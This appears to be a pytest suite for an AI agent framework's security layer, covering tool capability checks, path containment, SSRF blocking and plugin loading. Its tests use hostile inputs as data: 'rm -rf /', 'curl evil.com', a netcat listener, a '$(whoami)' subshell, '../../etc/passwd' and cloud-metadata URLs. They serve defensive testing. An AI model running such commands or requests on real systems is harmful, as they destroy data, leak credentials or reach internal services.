"""Integration tests for Capability-based Tool Authorization and Audit Remediations."""

from __future__ import annotations

from pathlib import Path
from unittest.mock import AsyncMock, patch

import pytest

from nexusai.core.config import SecuritySettings
from nexusai.core.errors import SecurityError, ToolExecutionError
from nexusai.security.capability import Capability, CapabilityProfile, CapabilityResolver
from nexusai.security.guard import ActionRequest, RiskLevel, SecurityGuard
from nexusai.security.identity import Identity, Role, TenantContext
from nexusai.tools.mcp.models import McpToolDefinition
from nexusai.tools.mcp.servers.web_fetcher import WebFetcherMcpServer, validate_ssrf_url
from nexusai.tools.mcp.tool import McpToolWrapper
from nexusai.tools.plugin_loader import PluginLoader, PluginLoadError
from nexusai.tools.plugin_manifest import PluginCapabilities, PluginManifest
from nexusai.tools.registry import ToolRegistry
from nexusai.tools.workspace.fs import ListDirectoryTool, ReadFileTool


@pytest.fixture
def empty_capability_guard() -> SecurityGuard:
    """SecurityGuard configured with an empty capability profile (Default-Deny)."""
    settings = SecuritySettings(strict_mode=True, auto_approve_low_risk=True)
    empty_resolver = CapabilityResolver(
        profiles={"none": CapabilityProfile(name="none", capabilities=[])}, default_profile="none"
    )
    return SecurityGuard(settings=settings, capability_resolver=empty_resolver)


@pytest.fixture
def custom_capability_guard() -> SecurityGuard:
    """SecurityGuard configured with custom test capabilities."""
    settings = SecuritySettings(strict_mode=True, auto_approve_low_risk=True)
    profiles = {
        "dev_profile": CapabilityProfile(
            name="dev_profile",
            capabilities=[
                Capability(domain="filesystem", action="read", resource="/workspace/**"),
                Capability(
                    domain="shell",
                    action="execute",
                    resource="git",
                    constraints={"max_duration_seconds": 30},
                ),
                Capability(domain="shell", action="execute", resource="pytest"),
                Capability(domain="mcp", action="invoke", resource="allowed_mcp_tool"),
            ],
        )
    }
    resolver = CapabilityResolver(profiles=profiles, default_profile="dev_profile")
    return SecurityGuard(settings=settings, capability_resolver=resolver)


def test_identity_with_no_capabilities_denied_all_tools(
    empty_capability_guard: SecurityGuard,
) -> None:
    """Verify that an identity with zero granted capabilities is denied from executing any tool."""
    identity = Identity(
        tenant_id="tenant-1",
        user_id="bob",
        role=Role.OPERATOR,
        metadata={"capabilities": []},
    )

    with TenantContext.scope(identity):
        req = ActionRequest(
            action_name="tool:workspace_read_file",
            risk_level=RiskLevel.LOW,
            description="Read workspace file",
            parameters={"file_path": "/workspace/src/app.py"},
        )
        with pytest.raises(SecurityError) as exc_info:
            empty_capability_guard.evaluate_permission(req)

        assert "Capability access denied" in str(exc_info.value)
        assert "has no granted capabilities" in str(exc_info.value)


def test_identity_filesystem_read_permitted_write_denied(
    custom_capability_guard: SecurityGuard,
) -> None:
    """Verify filesystem read is allowed while write is denied under dev_profile."""
    identity = Identity(tenant_id="tenant-1", user_id="charlie", role=Role.ADMIN)

    with TenantContext.scope(identity):
        # Read permitted
        read_req = ActionRequest(
            action_name="tool:workspace_read_file",
            risk_level=RiskLevel.LOW,
            description="Read workspace file",
            parameters={"file_path": "/workspace/config.yaml"},
        )
        assert custom_capability_guard.evaluate_permission(read_req) is True

        # Write denied
        write_req = ActionRequest(
            action_name="tool:workspace_write_file",
            risk_level=RiskLevel.HIGH,
            description="Write workspace file",
            parameters={"file_path": "/workspace/config.yaml"},
        )
        with pytest.raises(SecurityError) as exc_info:
            custom_capability_guard.evaluate_permission(write_req)

        assert "Capability access denied" in str(exc_info.value)
        assert "lacks capability for domain 'filesystem', action 'write'" in str(exc_info.value)


def test_identity_shell_execute_git_permitted_rm_denied(
    custom_capability_guard: SecurityGuard,
) -> None:
    """Verify shell execute permits git and denies rm under positive capability grants."""
    identity = Identity(tenant_id="tenant-1", user_id="dave", role=Role.ADMIN)

    with TenantContext.scope(identity):
        # git command permitted
        git_req = ActionRequest(
            action_name="tool:execute_terminal",
            risk_level=RiskLevel.HIGH,
            description="Run git status",
            parameters={"command": "git status"},
        )
        # Needs approval token or permitted by capability
        token, _ = custom_capability_guard.approval_service.create_token(
            tool_name="execute_terminal", arguments={"command": "git status"}, user_id="dave"
        )
        assert custom_capability_guard.evaluate_permission(git_req, approval_token=token) is True

        # rm command denied by capability before approval check
        rm_req = ActionRequest(
            action_name="tool:execute_terminal",
            risk_level=RiskLevel.HIGH,
            description="Delete file",
            parameters={"command": "rm -rf /tmp/data"},
        )
        with pytest.raises(SecurityError) as exc_info:
            custom_capability_guard.evaluate_permission(rm_req)

        assert "Capability access denied" in str(exc_info.value)
        assert "lacks capability for domain 'shell', action 'execute' on resource 'rm'" in str(
            exc_info.value
        )


def test_identity_shell_duration_constraint_enforced(
    custom_capability_guard: SecurityGuard,
) -> None:
    """Verify shell execution duration constraint violation is blocked."""
    identity = Identity(tenant_id="tenant-1", user_id="eve", role=Role.ADMIN)

    with TenantContext.scope(identity):
        long_req = ActionRequest(
            action_name="tool:execute_terminal",
            risk_level=RiskLevel.HIGH,
            description="Run long git clone",
            parameters={"command": "git clone https://example.com/repo", "timeout_seconds": "60"},
        )
        with pytest.raises(SecurityError) as exc_info:
            custom_capability_guard.evaluate_permission(long_req)

        assert "Constraint violated: duration 60.0s exceeds max_duration_seconds 30.0s" in str(
            exc_info.value
        )


def test_mcp_tool_invocation_checked_against_capability(
    custom_capability_guard: SecurityGuard,
) -> None:
    """Verify MCP tools are checked against mcp.invoke capability."""
    identity = Identity(tenant_id="tenant-1", user_id="frank", role=Role.OPERATOR)

    with TenantContext.scope(identity):
        # Allowed MCP tool
        allowed_req = ActionRequest(
            action_name="tool:mcp_allowed_mcp_tool",
            risk_level=RiskLevel.LOW,
            description="Invoke allowed MCP tool",
            parameters={"tool_name": "allowed_mcp_tool"},
        )
        assert custom_capability_guard.evaluate_permission(allowed_req) is True

        # Disallowed MCP tool
        denied_req = ActionRequest(
            action_name="tool:mcp_secret_tool",
            risk_level=RiskLevel.LOW,
            description="Invoke disallowed MCP tool",
            parameters={"tool_name": "secret_tool"},
        )
        with pytest.raises(SecurityError) as exc_info:
            custom_capability_guard.evaluate_permission(denied_req)

        assert "Capability access denied" in str(exc_info.value)
        assert "lacks capability for domain 'mcp', action 'invoke'" in str(exc_info.value)


@pytest.mark.asyncio
async def test_workspace_fs_containment_and_symlink_escape(tmp_path: Path) -> None:
    """Verify workspace fs tools strictly contain path access and reject traversal & symlink escapes."""
    ws = tmp_path / "workspace"
    ws.mkdir()
    (ws / "hello.txt").write_text("nexusai safe file")

    read_tool = ReadFileTool(workspace_root=ws)
    list_tool = ListDirectoryTool(workspace_root=ws)

    # Safe access
    res = await read_tool.execute("hello.txt")
    assert res == "nexusai safe file"

    items = await list_tool.execute(".")
    assert items == ["hello.txt"]

    # Traversal escape denied
    escape_read = await read_tool.execute("../../etc/passwd")
    assert "Path traversal denied" in escape_read

    escape_list = await list_tool.execute("../")
    assert "Path traversal denied" in escape_list

    # Symlink escape denied
    secret_file = tmp_path / "secret.key"
    secret_file.write_text("private-key-12345")
    symlink_file = ws / "symlink_secret"
    try:
        symlink_file.symlink_to(secret_file)
        escape_symlink = await read_tool.execute("symlink_secret")
        assert "Path traversal denied" in escape_symlink
    except OSError:
        pass


def test_mcp_web_fetcher_ssrf_protection() -> None:
    """Verify MCP web fetcher rejects localhost, RFC1918, link-local, and cloud metadata."""
    blocked_urls = [
        "http://127.0.0.1:8000/admin",
        "http://localhost/metrics",
        "http://169.254.169.254/latest/meta-data/",
        "http://10.0.0.1/internal",
        "http://192.168.1.1/router",
        "http://[::1]/debug",
    ]

    for url in blocked_urls:
        with pytest.raises(ValueError) as exc_info:
            validate_ssrf_url(url)
        assert "SSRF Protection" in str(exc_info.value)


@pytest.mark.asyncio
async def test_mcp_web_fetcher_redirect_hop_validation() -> None:
    """Verify MCP web fetcher intercepts and blocks redirects pointing to private metadata."""
    server = WebFetcherMcpServer()

    # Mock response that redirects to 169.254.169.254
    mock_redirect_resp = AsyncMock()
    mock_redirect_resp.is_redirect = True
    mock_redirect_resp.headers = {"Location": "http://169.254.169.254/latest/meta-data/"}

    with patch("httpx.AsyncClient.get", return_value=mock_redirect_resp):
        with pytest.raises(ValueError) as exc_info:
            await server._safe_http_get("http://example.com/redirect", headers={}, timeout=5.0)

        assert "SSRF Protection" in str(exc_info.value)
        assert "169.254.169.254" in str(exc_info.value)


def test_plugin_loader_pre_import_manifest_validation() -> None:
    """Verify PluginLoader validates manifest capabilities BEFORE calling importlib.import_module."""
    registry = ToolRegistry()
    loader = PluginLoader(registry=registry)

    # Untrusted plugin module with no manifest rejected before import
    with pytest.raises(PluginLoadError) as exc_info:
        loader.load_from_module_path("untrusted_evil_package.plugin")

    assert "Untrusted plugin module" in str(exc_info.value)
    assert "no validated manifest" in str(exc_info.value)

    # Manifest requesting disallowed capabilities rejected by policy engine
    manifest = PluginManifest(
        name="violator_plugin",
        version="1.0.0",
        entrypoint="some.module",
        capabilities=PluginCapabilities(terminal_execution=True),  # Terminal disabled by default
    )
    with pytest.raises(SecurityError) as sec_exc:
        loader.load_from_module_path("violator_plugin", manifest=manifest)

    assert "Security Policy Violation" in str(sec_exc.value)
    assert "terminal_execution" in str(sec_exc.value)


def test_mcp_tool_schema_strictness_and_extra_forbid() -> None:
    """Verify MCP tool schema rejects unknown types and sets extra='forbid'."""
    client = AsyncMock()
    client.server_name = "test_server"

    # Tool with empty properties generates model with extra="forbid"
    empty_def = McpToolDefinition(
        name="no_props_tool",
        description="Tool with no properties",
        input_schema={"type": "object", "properties": {}},
    )
    wrapper = McpToolWrapper(client=client, definition=empty_def)
    assert wrapper.input_schema.model_config.get("extra") == "forbid"

    # Passing extraneous properties to no_props_tool raises ValidationError
    with pytest.raises(Exception):
        wrapper.input_schema(unexpected_arg="malicious_payload")

    # Tool with unknown schema type raises ToolExecutionError
    unknown_type_def = McpToolDefinition(
        name="unknown_type_tool",
        description="Tool with unknown schema type",
        input_schema={
            "type": "object",
            "properties": {
                "weird_param": {"type": "unsupported_weird_type"},
            },
        },
    )
    with pytest.raises(ToolExecutionError) as exc_info:
        McpToolWrapper(client=client, definition=unknown_type_def)

    assert "Unsupported or unknown JSON Schema type" in str(exc_info.value)


def test_shell_command_chaining_and_subshell_injection_prevention(
    custom_capability_guard: SecurityGuard,
) -> None:
    """Verify that shell command chaining (&&, ;, |, subshells) evaluates every binary."""
    identity = Identity(tenant_id="tenant-1", user_id="dave", role=Role.ADMIN)

    with TenantContext.scope(identity):
        # 1. Allowed chained commands (both git and pytest are in dev_profile)
        ok_chained = ActionRequest(
            action_name="tool:execute_terminal",
            risk_level=RiskLevel.HIGH,
            description="Run git status and pytest",
            parameters={"command": "git status && pytest -v"},
        )
        token, _ = custom_capability_guard.approval_service.create_token(
            tool_name="execute_terminal",
            arguments={"command": "git status && pytest -v"},
            user_id="dave",
        )
        assert custom_capability_guard.evaluate_permission(ok_chained, approval_token=token) is True

        # 2. Malicious chain with unallowed command (rm)
        bad_chain_and = ActionRequest(
            action_name="tool:execute_terminal",
            risk_level=RiskLevel.HIGH,
            description="Run git status and rm -rf",
            parameters={"command": "git status && rm -rf /"},
        )
        with pytest.raises(SecurityError) as exc_info:
            custom_capability_guard.evaluate_permission(bad_chain_and)
        assert "Capability access denied for shell command 'rm'" in str(exc_info.value)

        # 3. Malicious chain with semicolon
        bad_chain_semi = ActionRequest(
            action_name="tool:execute_terminal",
            risk_level=RiskLevel.HIGH,
            description="Run git status; curl evil.com",
            parameters={"command": "git status; curl evil.com"},
        )
        with pytest.raises(SecurityError) as exc_info:
            custom_capability_guard.evaluate_permission(bad_chain_semi)
        assert "Capability access denied for shell command 'curl'" in str(exc_info.value)

        # 4. Malicious subshell $(whoami)
        bad_subshell = ActionRequest(
            action_name="tool:execute_terminal",
            risk_level=RiskLevel.HIGH,
            description="Run git with subshell command",
            parameters={"command": "git commit -m $(whoami)"},
        )
        with pytest.raises(SecurityError) as exc_info:
            custom_capability_guard.evaluate_permission(bad_subshell)
        assert "Capability access denied for shell command 'whoami'" in str(exc_info.value)

        # 5. Malicious pipe: pytest | nc
        bad_pipe = ActionRequest(
            action_name="tool:execute_terminal",
            risk_level=RiskLevel.HIGH,
            description="Pipe to netcat",
            parameters={"command": "pytest | nc -lvp 4444"},
        )
        with pytest.raises(SecurityError) as exc_info:
            custom_capability_guard.evaluate_permission(bad_pipe)
        assert "Capability access denied for shell command 'nc'" in str(exc_info.value)


def test_ssrf_protection_advanced_encodings() -> None:
    """Verify SSRF protection against decimal integer IP and IPv4-mapped IPv6."""
    # Decimal IP for 127.0.0.1 (2130706433)
    with pytest.raises(ValueError) as exc1:
        validate_ssrf_url("http://2130706433/")
    assert "SSRF Protection" in str(exc1.value)

    # Hex IP for 127.0.0.1 (0x7f000001)
    with pytest.raises(ValueError) as exc2:
        validate_ssrf_url("http://0x7f000001/")
    assert "SSRF Protection" in str(exc2.value)

    # IPv4-mapped IPv6 for 127.0.0.1 ([::ffff:127.0.0.1])
    with pytest.raises(ValueError) as exc3:
        validate_ssrf_url("http://[::ffff:127.0.0.1]/")
    assert "SSRF Protection" in str(exc3.value)


def test_plugin_loader_prefix_boundary_hardening() -> None:
    """Verify that module prefix matching does not trust unauthorized sibling modules."""
    registry = ToolRegistry()
    loader = PluginLoader(registry=registry)

    # plugins.calculator_evil must NOT be trusted because it's not plugins.calculator or plugins.calculator.*
    with pytest.raises(PluginLoadError) as exc_info:
        loader.load_from_module_path("plugins.calculator_evil")

    assert "Untrusted plugin module 'plugins.calculator_evil'" in str(exc_info.value)


def test_mcp_tool_schema_nullable_union_types() -> None:
    """Verify MCP tool schema correctly parses nullable list types (e.g. ['string', 'null'])."""
    client = AsyncMock()
    client.server_name = "test_server"

    nullable_def = McpToolDefinition(
        name="nullable_tool",
        description="Tool with nullable parameters",
        input_schema={
            "type": "object",
            "properties": {
                "optional_str": {
                    "type": ["string", "null"],
                    "description": "An optional string parameter",
                },
                "required_int": {
                    "type": "integer",
                    "description": "A required integer parameter",
                },
            },
            "required": ["required_int"],
        },
    )

    wrapper = McpToolWrapper(client=client, definition=nullable_def)
    model = wrapper.input_schema

    # Instantiation with only required parameter works
    instance = model(required_int=42)
    assert instance.required_int == 42
    assert instance.optional_str is None

    # Instantiation with optional parameter works
    instance2 = model(required_int=42, optional_str="hello")
    assert instance2.optional_str == "hello"


@pytest.mark.asyncio
async def test_web_fetcher_disabled_by_default() -> None:
    """Verify WebFetcherMcpServer is disabled by default and requires explicit enablement."""
    default_server = WebFetcherMcpServer()
    assert default_server.enabled is False

    # Attempting to fetch raises PermissionError
    with pytest.raises(PermissionError) as exc_info:
        await default_server._handle_fetch_url({"url": "https://example.com"})
    assert "WebFetcher MCP server is disabled by default" in str(exc_info.value)

    # When enabled, it proceeds past the enabled check
    enabled_server = WebFetcherMcpServer(enabled=True)
    assert enabled_server.enabled is True


def test_cli_doctor_reports_capability_profiles() -> None:
    """Verify nexusai doctor CLI command reports capability profiles status."""
    from typer.testing import CliRunner

    from nexusai.cli.app import app

    runner = CliRunner()
    result = runner.invoke(app, ["doctor"])
    assert result.exit_code == 0
    assert "Capability Profiles: configured" in result.output
    assert "unrestricted_admin" in result.output
